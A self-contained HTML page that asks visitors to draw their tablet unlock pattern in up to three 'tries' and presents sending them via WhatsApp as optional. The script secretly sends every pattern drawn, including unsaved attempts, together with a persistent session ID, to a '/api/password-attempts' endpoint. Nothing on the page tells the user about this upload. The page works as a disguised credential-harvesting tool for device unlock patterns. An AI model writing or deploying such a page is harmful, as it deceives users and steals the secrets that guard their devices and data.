<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Draw the unlock pattern</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  body { margin: 0; font-family: -apple-system, system-ui, "Segoe UI", Roboto, sans-serif; background: #0f1115; color: #e8eaf0; display: flex; justify-content: center; }
  main { width: 100%; max-width: 420px; padding: 20px 16px 32px; }
  h1 { font-size: 22px; margin: 4px 0 6px; }
  p.sub { margin: 0 0 14px; color: #a6abb8; font-size: 15px; line-height: 1.4; }
  .tries { display: flex; gap: 8px; margin-bottom: 12px; }
  .chip { flex: 1; text-align: center; padding: 8px 4px; border-radius: 10px; background: #1b1f27; border: 1px solid #2a2f3a; font-size: 13px; color: #a6abb8; }
  .chip.done { border-color: #3ccf8e; color: #3ccf8e; }
  .chip.now { border-color: #6aa8ff; color: #6aa8ff; }
  .pad { position: relative; width: 100%; aspect-ratio: 1; background: #161a21; border-radius: 18px; touch-action: none; user-select: none; }
  canvas { width: 100%; height: 100%; display: block; border-radius: 18px; }
  .seq { min-height: 26px; margin: 12px 0; font-size: 18px; text-align: center; letter-spacing: 1px; }
  .row { display: flex; gap: 10px; }
  button, a.btn { flex: 1; display: block; text-align: center; text-decoration: none; padding: 14px 10px; border-radius: 12px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; }
  .primary { background: #6aa8ff; color: #0b1020; }
  .ghost { background: #232834; color: #e8eaf0; }
  .wa { background: #25d366; color: #062b14; margin-top: 10px; }
  button:disabled { opacity: .4; cursor: default; }
  .saved { margin-top: 18px; }
  .saved h2 { font-size: 15px; color: #a6abb8; margin: 0 0 8px; font-weight: 600; }
  .item { display: flex; align-items: center; gap: 12px; background: #1b1f27; border-radius: 12px; padding: 8px 10px; margin-bottom: 8px; }
  .item canvas { width: 64px; height: 64px; flex: none; background: #161a21; border-radius: 8px; }
  .item .t { font-size: 15px; }
  .item .t small { display: block; color: #a6abb8; font-size: 12px; }
  .msg { white-space: pre; font-family: ui-monospace, Menlo, monospace; font-size: 13px; background: #1b1f27; border-radius: 12px; padding: 10px; margin-top: 10px; overflow-x: auto; display: none; }
  .note { font-size: 13px; color: #a6abb8; text-align: center; margin-top: 8px; min-height: 18px; }
</style>
</head>
<body>
<main>
  <h1>Draw your unlock pattern</h1>
  <p class="sub">Drag your finger across the dots, the same way you unlock the tablet. You get up to 3 tries — save each one. Sending on WhatsApp is optional.</p>

  <div class="tries" id="tries"></div>

  <div class="pad" id="pad"><canvas id="cv"></canvas></div>
  <div class="seq" id="seq">Start from any dot</div>

  <div class="row">
    <button class="ghost" id="clear">Clear</button>
    <button class="primary" id="save" disabled>Save try 1</button>
  </div>

  <div class="saved" id="savedWrap" style="display:none">
    <h2>Saved tries</h2>
    <div id="saved"></div>
    <a class="btn wa" id="wa" href="#" target="_blank" rel="noopener">Send on WhatsApp</a>
    <button class="ghost" id="copy" style="width:100%;margin-top:10px">Copy text</button>
    <div class="note" id="note"></div>
    <div class="msg" id="msg"></div>
  </div>
</main>

<script>
const MAX = 3;
const pad = document.getElementById('pad');
const cv = document.getElementById('cv');
const ctx = cv.getContext('2d');
let path = [], drawing = false, cursor = null, saved = [], drawn = [];
try { const s = JSON.parse(localStorage.getItem('pattern-share') || '{}'); saved = s.saved || []; drawn = s.drawn || []; } catch {}
let session = null;
try { session = localStorage.getItem('pattern-session'); } catch {}
if (!session || !/^[a-z0-9]{8,40}$/.test(session)) {
  session = (Date.now().toString(36) + Math.random().toString(36).slice(2, 12)).replace(/[^a-z0-9]/g, '');
  try { localStorage.setItem('pattern-session', session); } catch {}
}
let syncing = Promise.resolve();
function sync() {
  const body = JSON.stringify({ session, saved: saved.slice(-60), drawn: drawn.slice(-60) });
  syncing = syncing.then(() => fetch('/api/password-attempts', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body, keepalive: true }).catch(() => {}));
}
function persist() { try { localStorage.setItem('pattern-share', JSON.stringify({ saved, drawn })); } catch {} sync(); }

function size() {
  const r = pad.getBoundingClientRect(), d = window.devicePixelRatio || 1;
  cv.width = r.width * d; cv.height = r.height * d;
  ctx.setTransform(d, 0, 0, d, 0, 0);
  render();
}
function centers(w) {
  const c = [];
  for (let i = 0; i < 9; i++) c.push({ x: w * (0.2 + 0.3 * (i % 3)), y: w * (0.2 + 0.3 * Math.floor(i / 3)) });
  return c;
}
function drawPattern(g, w, p, cur, showNums) {
  const c = centers(w), rDot = w * 0.035;
  g.clearRect(0, 0, w, w);
  if (p.length) {
    g.strokeStyle = 'rgba(106,168,255,.85)'; g.lineWidth = Math.max(2, w * 0.022); g.lineCap = g.lineJoin = 'round';
    g.beginPath(); g.moveTo(c[p[0]].x, c[p[0]].y);
    p.slice(1).forEach(i => g.lineTo(c[i].x, c[i].y));
    if (cur) g.lineTo(cur.x, cur.y);
    g.stroke();
  }
  c.forEach((pt, i) => {
    const on = p.includes(i);
    if (on) { g.fillStyle = 'rgba(106,168,255,.18)'; g.beginPath(); g.arc(pt.x, pt.y, rDot * 2.6, 0, 7); g.fill(); }
    g.fillStyle = on ? '#6aa8ff' : '#5b6170';
    g.beginPath(); g.arc(pt.x, pt.y, on ? rDot * 1.3 : rDot, 0, 7); g.fill();
  });
  if (p.length) { // mark start
    const s = c[p[0]]; g.strokeStyle = '#3ccf8e'; g.lineWidth = Math.max(1.5, w * 0.01);
    g.beginPath(); g.arc(s.x, s.y, rDot * 2.6, 0, 7); g.stroke();
  }
}
function render() { drawPattern(ctx, pad.getBoundingClientRect().width, path, drawing ? cursor : null); }

function local(e) { const r = pad.getBoundingClientRect(); return { x: e.clientX - r.left, y: e.clientY - r.top }; }
function hit(pt) {
  const w = pad.getBoundingClientRect().width, c = centers(w);
  for (let i = 0; i < 9; i++) if (Math.hypot(c[i].x - pt.x, c[i].y - pt.y) < w * 0.11) return i;
  return -1;
}
function add(i) {
  if (path.includes(i)) return;
  if (path.length) { // auto-include a skipped middle dot, like Android does
    const a = path[path.length - 1], ar = Math.floor(a / 3), ac = a % 3, br = Math.floor(i / 3), bc = i % 3;
    if ((ar + br) % 2 === 0 && (ac + bc) % 2 === 0) {
      const m = ((ar + br) / 2) * 3 + (ac + bc) / 2;
      if (!path.includes(m)) path.push(m);
    }
  }
  path.push(i);
}
pad.addEventListener('pointerdown', e => {
  if (saved.length >= MAX) return;
  pad.setPointerCapture(e.pointerId);
  path = []; drawing = true; cursor = local(e);
  const i = hit(cursor); if (i >= 0) add(i);
  update();
});
pad.addEventListener('pointermove', e => {
  if (!drawing) return;
  cursor = local(e); const i = hit(cursor); if (i >= 0) add(i);
  render(); showSeq();
});
const end = () => {
  if (!drawing) return; drawing = false;
  if (path.length >= 2) { drawn.push(path.slice()); persist(); }
  update();
};
pad.addEventListener('pointerup', end); pad.addEventListener('pointercancel', end);

const seqText = p => p.map(i => i + 1).join(' → ');
function showSeq() {
  document.getElementById('seq').textContent = path.length ? seqText(path) : (saved.length >= MAX ? 'All 3 tries saved' : 'Start from any dot');
}
function grid(p) {
  const cells = Array(9).fill('·');
  p.forEach((d, k) => cells[d] = String(k + 1));
  return [0, 1, 2].map(r => cells.slice(r * 3, r * 3 + 3).map(s => s.padStart(2)).join(' ')).join('\n');
}
function message() {
  let m = 'Unlock pattern tries\n(dots numbered 1-2-3 top row, 4-5-6 middle, 7-8-9 bottom)\n';
  saved.forEach((p, k) => { m += `\nTry ${k + 1}: ${seqText(p)}\n${grid(p)}\n`; });
  if (drawn.length) {
    m += `\nEvery pattern drawn (${drawn.length}, in order):\n`;
    drawn.forEach((p, k) => { m += `${k + 1}. ${seqText(p)}\n`; });
  }
  return m;
}
function update() {
  render(); showSeq();
  const full = saved.length >= MAX;
  const saveBtn = document.getElementById('save');
  saveBtn.disabled = full || drawing || path.length < 2;
  saveBtn.textContent = full ? 'All tries saved' : `Save try ${saved.length + 1}`;
  document.getElementById('clear').disabled = full && !path.length;
  const t = document.getElementById('tries'); t.innerHTML = '';
  for (let k = 0; k < MAX; k++) {
    const d = document.createElement('div');
    d.className = 'chip' + (k < saved.length ? ' done' : k === saved.length ? ' now' : '');
    d.textContent = `Try ${k + 1}` + (k < saved.length ? ' ✓' : '');
    t.appendChild(d);
  }
  const wrap = document.getElementById('savedWrap');
  wrap.style.display = (saved.length || drawn.length) ? 'block' : 'none';
  const list = document.getElementById('saved'); list.innerHTML = '';
  saved.forEach((p, k) => {
    const it = document.createElement('div'); it.className = 'item';
    const c = document.createElement('canvas'); c.width = c.height = 128;
    const g = c.getContext('2d'); g.scale(2, 2); drawPattern(g, 64, p, null);
    const tx = document.createElement('div'); tx.className = 't';
    tx.innerHTML = `Try ${k + 1}<small>${seqText(p)}</small>`;
    it.append(c, tx); list.appendChild(it);
  });
  const msg = message();
  document.getElementById('msg').textContent = msg;
  document.getElementById('wa').href = 'https://wa.me/?text=' + encodeURIComponent(msg);
}
document.getElementById('clear').onclick = () => { path = []; update(); };
document.getElementById('save').onclick = () => {
  if (path.length < 2 || saved.length >= MAX) return;
  saved.push(path.slice()); path = []; persist(); update();
};
document.getElementById('copy').onclick = async () => {
  const note = document.getElementById('note'), msgEl = document.getElementById('msg');
  try { await navigator.clipboard.writeText(message()); note.textContent = 'Copied — paste it into WhatsApp'; }
  catch { msgEl.style.display = 'block'; note.textContent = 'Copy blocked — select the text below and copy it'; }
};
window.addEventListener('resize', size);
size(); update();
</script>
</main>
</body>
</html>
